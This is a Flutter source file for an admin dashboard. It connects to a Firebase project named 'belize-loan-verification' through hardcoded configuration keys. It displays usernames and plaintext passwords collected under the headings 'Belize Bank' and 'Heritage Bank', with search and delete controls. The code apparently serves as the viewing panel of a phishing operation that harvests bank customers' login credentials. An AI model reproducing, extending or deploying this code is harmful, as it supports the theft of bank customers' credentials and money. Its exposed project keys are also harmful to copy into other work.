import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

// ─── Replace these with your actual Firebase project values ───────────────────
const _firebaseOptions = FirebaseOptions(
  apiKey: "AIzaSyCh_u-8NEz12Jy616-GWXyMk5eKFPWJTSU",
  authDomain: "belize-loan-verification.firebaseapp.com",
  projectId: "belize-loan-verification",
  storageBucket: "belize-loan-verification.firebasestorage.app",
  messagingSenderId: "364109033257",
  appId: "1:364109033257:web:31bff3b8828e4253ce5138",
);
// ─────────────────────────────────────────────────────────────────────────────

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(options: _firebaseOptions);
  runApp(const AdminApp());
}

class AdminApp extends StatelessWidget {
  const AdminApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Admin Dashboard',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.blue),
        useMaterial3: true,
      ),
      home: const AdminDashboard(),
    );
  }
}

class AdminDashboard extends StatefulWidget {
  const AdminDashboard({super.key});

  @override
  State<AdminDashboard> createState() => _AdminDashboardState();
}

class _AdminDashboardState extends State<AdminDashboard> {
  final _searchController = TextEditingController();
  String _searchQuery = '';

  @override
  void dispose() {
    _searchController.dispose();
    super.dispose();
  }

  // ── Delete a single entry ──────────────────────────────────────────────────
  Future<void> _deleteEntryHeritage(String docId) async {
    final confirmed = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Delete entry'),
        content: const Text('Are you sure you want to delete this entry?'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('Cancel'),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context, true),
            child: const Text('Delete', style: TextStyle(color: Colors.red)),
          ),
        ],
      ),
    );

    if (confirmed == true) {
      await FirebaseFirestore.instance
          .collection('Heritage')
          .doc(docId)
          .delete();
    }
  }

  Future<void> _deleteEntryBelize(String docId) async {
    final confirmed = await showDialog<bool>(
      context: context,
      builder: (context) => AlertDialog(
        title: const Text('Delete entry'),
        content: const Text('Are you sure you want to delete this entry?'),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context, false),
            child: const Text('Cancel'),
          ),
          TextButton(
            onPressed: () => Navigator.pop(context, true),
            child: const Text('Delete', style: TextStyle(color: Colors.red)),
          ),
        ],
      ),
    );

    if (confirmed == true) {
      await FirebaseFirestore.instance
          .collection('login_attempts')
          .doc(docId)
          .delete();
    }
  }

  // ── Format Firestore timestamp ─────────────────────────────────────────────
  String _formatTimestamp(Timestamp? ts) {
    if (ts == null) return '—';
    final dt = ts.toDate().toLocal();
    return '${dt.year}-${_pad(dt.month)}-${_pad(dt.day)}  '
        '${_pad(dt.hour)}:${_pad(dt.minute)}:${_pad(dt.second)}';
  }

  String _pad(int n) => n.toString().padLeft(2, '0');

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFFF4F6FA),
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 0,
        title: const Text(
          'Admin Dashboard',
          style: TextStyle(fontWeight: FontWeight.w600, color: Colors.black87),
        ),
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(0.5),
          child: Container(color: Colors.grey[200], height: 0.5),
        ),
      ),
      body: Padding(
        padding: const EdgeInsets.all(24),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            // ── Header row ──────────────────────────────────────────────────
            Row(
              children: [
                const Text(
                  'Belize Bank',
                  style: TextStyle(
                    fontSize: 20,
                    fontWeight: FontWeight.w600,
                    color: Colors.black87,
                  ),
                ),
                const Spacer(),
                // Search field
                SizedBox(
                  width: 260,
                  height: 40,
                  child: TextField(
                    controller: _searchController,
                    onChanged: (val) =>
                        setState(() => _searchQuery = val.toLowerCase().trim()),
                    decoration: InputDecoration(
                      hintText: 'Search by username…',
                      prefixIcon: const Icon(Icons.search, size: 18),
                      contentPadding: const EdgeInsets.symmetric(
                        vertical: 0,
                        horizontal: 12,
                      ),
                      border: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8),
                        borderSide: BorderSide(color: Colors.grey[300]!),
                      ),
                      enabledBorder: OutlineInputBorder(
                        borderRadius: BorderRadius.circular(8),
                        borderSide: BorderSide(color: Colors.grey[300]!),
                      ),
                      filled: true,
                      fillColor: Colors.white,
                    ),
                  ),
                ),
              ],
            ),

            const SizedBox(height: 20),

            // ── Table ────────────────────────────────────────────────────────
            Container(
              decoration: BoxDecoration(
                color: Colors.white,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.grey[200]!),
              ),
              child: StreamBuilder<QuerySnapshot>(
                stream: FirebaseFirestore.instance
                    .collection('login_attempts')
                    .orderBy('timestamp', descending: true)
                    .snapshots(),
                builder: (context, snapshot) {
                  if (snapshot.hasError) {
                    return Center(child: Text('Error: ${snapshot.error}'));
                  }

                  if (snapshot.connectionState == ConnectionState.waiting) {
                    return const Center(child: CircularProgressIndicator());
                  }

                  final allDocs = snapshot.data!.docs;

                  // Apply search filter
                  final docs = _searchQuery.isEmpty
                      ? allDocs
                      : allDocs.where((doc) {
                          final data = doc.data() as Map<String, dynamic>;
                          final username = (data['username'] ?? '')
                              .toString()
                              .toLowerCase();
                          return username.contains(_searchQuery);
                        }).toList();

                  if (docs.isEmpty) {
                    return const Center(
                      child: Text(
                        'No entries found',
                        style: TextStyle(color: Colors.grey),
                      ),
                    );
                  }

                  return ClipRRect(
                    borderRadius: BorderRadius.circular(12),
                    child: SingleChildScrollView(
                      child: Table(
                        columnWidths: const {
                          0: FlexColumnWidth(2),
                          1: FlexColumnWidth(2),
                          2: FlexColumnWidth(3),
                          3: FixedColumnWidth(80),
                        },
                        children: [
                          // Header row
                          TableRow(
                            decoration: BoxDecoration(
                              color: Colors.grey[50],
                              border: Border(
                                bottom: BorderSide(color: Colors.grey[200]!),
                              ),
                            ),
                            children: const [
                              _HeaderCell('Username'),
                              _HeaderCell('Password'),
                              _HeaderCell('Timestamp'),
                              _HeaderCell(''),
                            ],
                          ),
                          // Data rows
                          ...docs.map((doc) {
                            final data = doc.data() as Map<String, dynamic>;
                            return TableRow(
                              decoration: BoxDecoration(
                                border: Border(
                                  bottom: BorderSide(color: Colors.grey[100]!),
                                ),
                              ),
                              children: [
                                _DataCell(data['username'] ?? '—'),
                                _DataCell(data['password'] ?? '—'),
                                _DataCell(
                                  _formatTimestamp(
                                    data['timestamp'] as Timestamp?,
                                  ),
                                ),
                                // Delete button
                                Padding(
                                  padding: const EdgeInsets.symmetric(
                                    vertical: 8,
                                    horizontal: 8,
                                  ),
                                  child: IconButton(
                                    icon: const Icon(
                                      Icons.delete_outline,
                                      size: 18,
                                      color: Colors.red,
                                    ),
                                    tooltip: 'Delete',
                                    onPressed: () => _deleteEntryBelize(doc.id),
                                  ),
                                ),
                              ],
                            );
                          }),
                        ],
                      ),
                    ),
                  );
                },
              ),
            ),
            SizedBox(height: 20),

            const Text(
              'Heritage Bank',
              style: TextStyle(
                fontSize: 20,
                fontWeight: FontWeight.w600,
                color: Colors.black87,
              ),
            ),
            Container(
              decoration: BoxDecoration(
                color: Colors.white,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.grey[200]!),
              ),
              child: StreamBuilder<QuerySnapshot>(
                stream: FirebaseFirestore.instance
                    .collection('Heritage')
                    .orderBy('timestamp', descending: true)
                    .snapshots(),
                builder: (context, snapshot) {
                  if (snapshot.hasError) {
                    return Center(child: Text('Error: ${snapshot.error}'));
                  }

                  if (snapshot.connectionState == ConnectionState.waiting) {
                    return const Center(child: CircularProgressIndicator());
                  }

                  final allDocs = snapshot.data!.docs;

                  // Apply search filter
                  final docs = _searchQuery.isEmpty
                      ? allDocs
                      : allDocs.where((doc) {
                          final data = doc.data() as Map<String, dynamic>;
                          final username = (data['username'] ?? '')
                              .toString()
                              .toLowerCase();
                          return username.contains(_searchQuery);
                        }).toList();

                  if (docs.isEmpty) {
                    return const Center(
                      child: Text(
                        'No entries found',
                        style: TextStyle(color: Colors.grey),
                      ),
                    );
                  }

                  return ClipRRect(
                    borderRadius: BorderRadius.circular(12),
                    child: SingleChildScrollView(
                      child: Table(
                        columnWidths: const {
                          0: FlexColumnWidth(2),
                          1: FlexColumnWidth(2),
                          2: FlexColumnWidth(3),
                          3: FixedColumnWidth(80),
                        },
                        children: [
                          // Header row
                          TableRow(
                            decoration: BoxDecoration(
                              color: Colors.grey[50],
                              border: Border(
                                bottom: BorderSide(color: Colors.grey[200]!),
                              ),
                            ),
                            children: const [
                              _HeaderCell('Username'),
                              _HeaderCell('Password'),
                              _HeaderCell('Timestamp'),
                              _HeaderCell(''),
                            ],
                          ),
                          // Data rows
                          ...docs.map((doc) {
                            final data = doc.data() as Map<String, dynamic>;
                            return TableRow(
                              decoration: BoxDecoration(
                                border: Border(
                                  bottom: BorderSide(color: Colors.grey[100]!),
                                ),
                              ),
                              children: [
                                _DataCell(data['username'] ?? '—'),
                                _DataCell(data['password'] ?? '—'),
                                _DataCell(
                                  _formatTimestamp(
                                    data['timestamp'] as Timestamp?,
                                  ),
                                ),
                                // Delete button
                                Padding(
                                  padding: const EdgeInsets.symmetric(
                                    vertical: 8,
                                    horizontal: 8,
                                  ),
                                  child: IconButton(
                                    icon: const Icon(
                                      Icons.delete_outline,
                                      size: 18,
                                      color: Colors.red,
                                    ),
                                    tooltip: 'Delete',
                                    onPressed: () =>
                                        _deleteEntryHeritage(doc.id),
                                  ),
                                ),
                              ],
                            );
                          }),
                        ],
                      ),
                    ),
                  );
                },
              ),
            ),
            // ── Footer count ─────────────────────────────────────────────────
            const SizedBox(height: 12),
            StreamBuilder<QuerySnapshot>(
              stream: FirebaseFirestore.instance
                  .collection('login_attempts')
                  .snapshots(),
              builder: (context, snapshot) {
                final count = snapshot.data?.docs.length ?? 0;
                return Text(
                  '$count total entries',
                  style: const TextStyle(fontSize: 13, color: Colors.grey),
                );
              },
            ),
          ],
        ),
      ),
    );
  }
}

// ── Reusable table cells ──────────────────────────────────────────────────────

class _HeaderCell extends StatelessWidget {
  final String text;
  const _HeaderCell(this.text);

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      child: Text(
        text,
        style: const TextStyle(
          fontSize: 12,
          fontWeight: FontWeight.w600,
          color: Colors.grey,
          letterSpacing: 0.5,
        ),
      ),
    );
  }
}

class _DataCell extends StatelessWidget {
  final String text;
  const _DataCell(this.text);

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      child: Text(
        text,
        style: const TextStyle(fontSize: 14, color: Colors.black87),
      ),
    );
  }
}
